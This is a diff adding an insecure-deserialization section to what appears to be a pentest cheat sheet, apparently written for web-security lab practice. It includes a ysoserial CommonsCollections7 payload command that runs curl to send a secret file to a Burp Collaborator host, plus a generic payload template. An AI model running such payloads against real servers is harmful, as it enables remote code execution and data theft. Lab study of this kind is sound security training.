@@ -55,3 +55,16 @@ With <b>`<meta>`</b> html tag we can redirect the "victim" to our javascript inj
 ### Oracle
 
 ### SQLite
+
+## Insecure Deserialization Section
+
+
+### Java
+#### ysoseriar.jar
+payloads about `ysoseriar` <br>
+<b>Dont forget</b> the below payloads requires url encoding after payload are generated
+```bash
+java -jar ysoseriar.jar CommonsCollections7 'curl -d @/home/carlos/secret k3of2usea0s8kzkwsqnme9bj2a83ws.burpcollaborator.net' | gzip|base64 
+
+java -jar ysoseriar.jar <PAYLOAD> 'COMMAND' | encoding
+```
